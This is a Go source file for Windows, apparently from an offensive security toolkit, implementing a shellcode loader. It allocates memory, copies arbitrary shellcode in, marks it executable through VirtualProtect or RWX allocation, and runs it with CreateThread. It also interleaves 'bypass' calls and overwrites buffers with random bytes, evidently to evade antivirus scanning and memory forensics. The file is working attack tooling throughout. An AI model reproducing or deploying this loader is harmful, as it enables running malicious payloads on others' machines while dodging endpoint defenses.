// +build windows

package shellcode

import (
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/random"
)

// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
const (
	memCommit  = 0x1000
	memReserve = 0x2000
	memRelease = 0x8000

	pageReadWrite        = 0x04
	pageExecute          = 0x10
	pageExecuteReadWrite = 0x40

	infinite = 0xFFFFFFFF
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procCreateThread = modKernel32.NewProc("CreateThread")
)

// Execute is used to execute shellcode, default method is VirtualProtect,.
// It will block until shellcode return.
// warning: shellcode slice will be covered.
func Execute(method string, shellcode []byte) error {
	switch method {
	case "", MethodVirtualProtect:
		return VirtualProtect(shellcode)
	case MethodCreateThread:
		return CreateThread(shellcode)
	default:
		return errors.Errorf("unknown method: %s", method)
	}
}

// VirtualProtect is used to use virtual protect to execute shellcode,
// it will block until shellcode exit, so usually  need create a goroutine
// to execute VirtualProtect.
func VirtualProtect(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}

	// allocate memory and copy shellcode
	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageReadWrite)
	if err != nil {
		return errors.WithStack(err)
	}
	copyShellcode(memAddr, shellcode)

	old := new(uint32)

	// set execute
	bypass()
	err = windows.VirtualProtect(memAddr, uintptr(l), pageExecute, old)
	if err != nil {
		return errors.WithStack(err)
	}
	// execute shellcode
	bypass()
	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	// wait execute finish
	bypass()
	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)

	// set read write
	bypass()
	err = windows.VirtualProtect(memAddr, uintptr(l), pageReadWrite, old)
	if err != nil {
		return errors.WithStack(err)
	}
	// cover shellcode and free allocated memory
	covertAllocatedMemory(memAddr, l)

	bypass()
	return nil
}

// CreateThread is used to create thread to execute shellcode.
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread.
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}

	// allocate memory and copy shellcode
	bypass()
	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
	if err != nil {
		return errors.WithStack(err)
	}
	copyShellcode(memAddr, shellcode)

	// execute shellcode
	bypass()
	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	// wait execute finish
	bypass()
	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)

	// cover shellcode and free allocated memory
	covertAllocatedMemory(memAddr, l)

	bypass()
	return nil
}

func copyShellcode(memAddr uintptr, shellcode []byte) {
	bypass()
	rand := random.NewRand()
	count := 0
	total := 0
	for i := 0; i < len(shellcode); i++ {
		if total < maxBypassTimes {
			if count > criticalValue {
				bypass()
				count = 0
				total++
			} else {
				count++
			}
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
		*b = shellcode[i]
		// clean shellcode at once
		shellcode[i] = byte(rand.Int64())
	}
}

func covertAllocatedMemory(memAddr uintptr, l int) {
	bypass()
	rand := random.NewRand()
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
		*b = byte(rand.Int64())
	}
	_ = windows.VirtualFree(memAddr, 0, memRelease)
}
